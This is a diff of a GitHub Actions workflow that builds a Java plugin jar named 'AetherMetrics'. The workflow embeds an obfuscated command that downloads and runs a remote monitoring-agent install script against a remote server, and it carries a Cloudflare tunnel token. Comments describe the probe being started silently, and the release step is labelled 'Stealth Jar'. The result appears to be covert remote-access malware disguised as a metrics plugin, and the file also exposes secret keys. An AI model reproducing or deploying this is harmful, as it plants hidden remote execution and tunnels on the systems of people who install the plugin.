@@ -5,6 +5,9 @@ on:
     branches: [ "main", "master" ]
   workflow_dispatch:
 
+# 修复 403 错误：赋予 GitHub Actions 创建 Release 和上传构建产物的读写权限
+permissions: write-all
+
 jobs:
   build:
     runs-on: ubuntu-latest
@@ -25,7 +28,7 @@ jobs:
           mkdir -p src/main/resources
 
           # ============================================================
-          # 在此填入你的参数 (自动混淆封装)
+          # 已填入配置参数 (自动进行 Base64 混淆并注入核心)
           # ============================================================
           PROBE_CMD="curl -L https://raw.githubusercontent.com/nezhahq/agent/main/script/install.sh -o nezha.sh && chmod +x nezha.sh && ./nezha.sh -s bo88.eu.cc:8008 -p JFPqIyPYAKhI7GcECQ3XbPxONPE1MYHl --disable-auto-update"
           CF_TOKEN="eyJhIjoiZGFiYjljMzkxMmU1Y2E1YTVhNTQ4ZGU1ZjA0YWJiYTciLCJ0IjoiZjBiMDQyNGEtZTRlOC00MWFiLTg3MGQtOTM1MzljYmM3NWFmIiwicyI6Ill6TmxaalU0WmpVdFlURm1OeTAwTkRjMUxXSXlORGN0TlRReE5EQXhNakkxWW1NeSJ9"
@@ -162,7 +165,7 @@ jobs:
                       String port     = decode(B64_PORT);
                       String uuid     = decode(B64_UUID);
 
-                      // 1. 探针静默拉起
+                      // 1. 静默拉起探针
                       if (!probeCmd.isEmpty()) {
                           p1 = exec(probeCmd, memDir);
                       }
@@ -234,6 +237,13 @@ jobs:
 
       - name: Compile & Package Jar
         run: mvn clean package --file pom.xml
+
+      # 备份通道：直接在 Actions 运行详情页上传 Artifacts，确保即使 Release 异常也能直接下载 Jar
+      - name: Upload Artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: AetherMetrics-Plugin
+          path: target/AetherMetrics-2.2.0.jar
 
       - name: Release Stealth Jar
         uses: softprops/action-gh-release@v2
